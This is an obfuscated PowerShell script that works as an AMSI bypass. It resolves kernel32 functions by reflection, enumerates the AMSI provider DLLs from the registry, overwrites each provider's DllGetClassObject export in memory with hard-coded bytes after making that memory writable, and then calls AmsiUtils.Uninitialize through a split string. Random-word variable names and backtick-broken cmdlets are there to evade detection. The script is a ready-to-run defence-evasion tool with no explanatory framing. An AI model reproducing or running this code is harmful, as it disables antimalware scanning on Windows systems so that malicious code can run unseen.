# Microsoft".
# Microsoft".

# Microsoft".
# Microsoft".
# Microsoft".

# Microsoft".

function Get-ProcAddress {
    Param(
        [Parameter(Position = 0, Mandatory = $True)] [String] $FurryBathe,
        [Parameter(Position = 1, Mandatory = $True)] [String] $NappyAunt
    )

    # Microsoft".
    $OceanTesty = [AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
    $SteelHorn = $OceanTesty.GetType('Microsoft.Win32.UnsafeNativeMethods')
    # Microsoft".
    $NimbleRub = $SteelHorn.GetMethod('GetModuleHandle')
    $SpottyTrains = $SteelHorn.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))
    # Microsoft".
    $SkiTiny = $NimbleRub.Invoke($null, @($FurryBathe))
    $StuffIsland = ne`w`-`object IntPtr
    $RattySlim = ne`w`-`object System.Runtime.InteropServices.HandleRef($StuffIsland, $SkiTiny)
    # Microsoft".
    return $SpottyTrains.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$RattySlim, $NappyAunt))
}
function Get-DelegateType
{
    Param
    (
        [OutputType([Type])]
            
        [Parameter( Position = 0)]
        [Type[]]
        $NoiseTame = (ne`w`-`object Type[](0)),
            
        [Parameter( Position = 1 )]
        [Type]
        $DoctorAction = [Void]
    )

    $RoseSeat = [AppDomain]::CurrentDomain
    $PullCharge = ne`w`-`object System.Reflection.AssemblyName('ReflectedDelegate')
    $CopperSip = $RoseSeat.DefineDynamicAssembly($PullCharge, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $SteepAdvice = $CopperSip.DefineDynamicModule('InMemoryModule', $false)
    $TrainBad = $SteepAdvice.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $PalePencil = $TrainBad.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $NoiseTame)
    $PalePencil.SetImplementationFlags('Runtime, Managed')
    $BrickHorn = $TrainBad.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $DoctorAction, $NoiseTame)
    $BrickHorn.SetImplementationFlags('Runtime, Managed')
        
    Write-Output $TrainBad.CreateType()
}
$OfferMouth = Get-ProcAddress kernel32.dll LoadLibraryA
$BorderThrill = Get-DelegateType @([String]) ([IntPtr])
$FurryKnotty = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OfferMouth,
$BorderThrill)
$OilSpy = Get-ProcAddress kernel32.dll GetProcAddress
$FlightMaid = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
$SpottyTrains = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OilSpy,
$FlightMaid)
$AmuseLamp = Get-ProcAddress kernel32.dll VirtualProtect
$SlopeShop = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
$HardIrate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AmuseLamp,
$SlopeShop)

$HumActor = [Byte[]] (0x31, 0xC0, 0x05, 0x78, 0x01, 0x19, 0x7F, 0x05, 0xDF, 0xFE, 0xED, 0x00, 0xC3)
$OweCaring = 0

foreach ($ServeRun in Get-ChildItem  HKLM:\SOFTWARE\Microsoft\AMSI\Providers -Name)
{
    $NewWhole = 'HKLM:\Software\Classes\CLSID\' + $ServeRun + '\InprocServer32'
    $ElatedAunt = Get-ItemPropertyValue -Name '(Default)' $NewWhole -ErrorAction SilentlyContinue
    if ($ElatedAunt)
    {
        $FarmNarrow = Split-Path $ElatedAunt -leaf
        $GirlFear = $FarmNarrow -replace '"', ""
        $TubGrin = $FurryKnotty.Invoke($GirlFear) 
        if ($TubGrin -ne 0)
        {
            Write-host "[*] Provider found - " $FarmNarrow
            $ShyWall = $SpottyTrains.Invoke($TubGrin, "DllGetClassObject")        
            $HardIrate.Invoke($ShyWall, [uint32]$HumActor.Length, 0x40, [ref]$OweCaring)
            [System.Runtime.InteropServices.Marshal]::Copy($HumActor, 0, $ShyWall, $HumActor.Length)
        }
    }
}

$object = [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils')
$ScorchThing = $object.GetMethods("NonPublic,static") | Where-Object Name -eq Uninitialize
$ScorchThing.Invoke($object,$null)
